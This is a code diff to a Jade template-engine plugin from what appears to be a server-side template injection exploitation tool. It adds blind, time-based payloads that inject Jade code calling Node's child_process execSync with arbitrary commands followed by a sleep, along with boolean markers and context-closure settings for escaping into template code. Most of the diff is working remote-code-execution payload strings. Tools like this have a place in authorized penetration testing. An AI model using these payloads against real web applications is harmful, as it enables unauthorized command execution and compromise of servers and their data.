@@ -34,12 +34,18 @@ class Jade(Plugin):
             'evaluate': '- %(code)s'
         },
         'blind' : {
-            'call': 'execute',
-            'blind': """sleep %(delay)i"""
+            'call': 'blind_execute',
+            'bool_true' : 'TRUE',
+            'bool_false' : 'FALSE'
+        },
+        # Not using execute here since it's rendered and requires set headers and trailers
+        'blind_execute_bool' : {
+            'call': 'inject',
+            'blind_execute_bool': """\n- global.process.mainModule.require("child_process").execSync("%(code)s && sleep %(delay)i")//"""
         },
         'execute' : {
             'call': 'render',
-            'execute': """= global.process.mainModule.require('child_process').execSync("%(code)s")"""
+            'execute': """= global.process.mainModule.require("child_process").execSync("%(code)s")"""
         }
 
     }
@@ -47,7 +53,7 @@ class Jade(Plugin):
     contexts = [
     
         # Text context, no closures
-        { 'level': 1 },
+        { 'level': 0 },
 
         # Attribute close a(href=\'%s\')
         { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : { 1: closures.javascript_ctx_closures[1] } },
@@ -65,6 +71,16 @@ class Jade(Plugin):
         self.set('eval', 'javascript')
         self.set('engine', 'jade')
 
-    def execute(self, code):
+    def execute(self, code, prefix = None, suffix = None, blind = False):
         # Quote code before submitting it
-        return super(Jade, self).execute(quote(code))
+        return super(Jade, self).execute(quote(code), prefix, suffix, blind)
+        
+    def detect_blind_engine(self):
+
+        if not self.get('blind'):
+            return
+
+        self.set('language', 'javascript')
+        self.set('exec', True)
+        self.set('engine', 'jade')
+        self.set('eval', 'javascript')
